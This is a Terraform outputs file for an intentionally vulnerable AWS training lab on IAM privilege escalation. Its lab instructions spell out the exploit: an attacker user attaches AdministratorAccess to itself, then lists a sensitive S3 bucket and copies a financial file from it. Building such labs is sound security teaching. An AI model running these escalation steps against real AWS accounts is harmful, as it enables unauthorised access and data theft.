output "attacker_user_name" {
  description = "IAM username for the attacker (low-priv starting point)"
  value       = aws_iam_user.attacker.name
}

output "attacker_access_key_id" {
  description = "Access key ID for attacker-user - use in exploit steps"
  value       = aws_iam_access_key.attacker.id
  sensitive   = false
}

output "attacker_secret_access_key" {
  description = "Secret key for attacker-user - use in exploit steps"
  value       = aws_iam_access_key.attacker.secret
  sensitive   = true
}

output "admin_role_arn" {
  description = "ARN of the high-priv internal service role (escalation target)"
  value       = aws_iam_role.admin_role.arn
}

output "public_bucket_name" {
  description = "S3 bucket attacker can access legitimately"
  value       = aws_s3_bucket.public_bucket.bucket
}

output "sensitive_bucket_name" {
  description = "S3 bucket attacker CANNOT access initially - goal of the lab"
  value       = aws_s3_bucket.sensitive_bucket.bucket
}

output "permission_boundary_arn" {
  description = "ARN of permission boundary policy - apply this to remediate"
  value       = aws_iam_policy.permission_boundary.arn
}

output "lab_instructions" {
  description = "Quick start commands"
  value       = <<-EOT
    ==========================================
    CASE 02 - IAM PRIVILEGE ESCALATION LAB
    ==========================================

    STEP 1 - Configure attacker profile:
      aws configure --profile attacker
      Access Key ID     : (use attacker_access_key_id output)
      Secret Access Key : run: terraform output -raw attacker_secret_access_key
      Region            : us-east-1

    STEP 2 - Verify identity:
      aws sts get-caller-identity --profile attacker

    STEP 3 - Try accessing sensitive bucket (should FAIL):
      aws s3 ls s3://${aws_s3_bucket.sensitive_bucket.bucket} --profile attacker

    STEP 4 - Enumerate permissions:
      aws iam list-attached-user-policies --user-name ${aws_iam_user.attacker.name} --profile attacker

    STEP 5 - EXPLOIT - attach AdministratorAccess to self:
      aws iam attach-user-policy \
        --user-name ${aws_iam_user.attacker.name} \
        --policy-arn arn:aws:iam::aws:policy/AdministratorAccess \
        --profile attacker

    STEP 6 - Access sensitive bucket (should now SUCCEED):
      aws s3 ls s3://${aws_s3_bucket.sensitive_bucket.bucket} --profile attacker
      aws s3 cp s3://${aws_s3_bucket.sensitive_bucket.bucket}/financial/q3-2022-revenue.txt . --profile attacker

    STEP 7 - REMEDIATE:
      See writeup/hashnode-article.md for full remediation steps
    ==========================================
  EOT
}
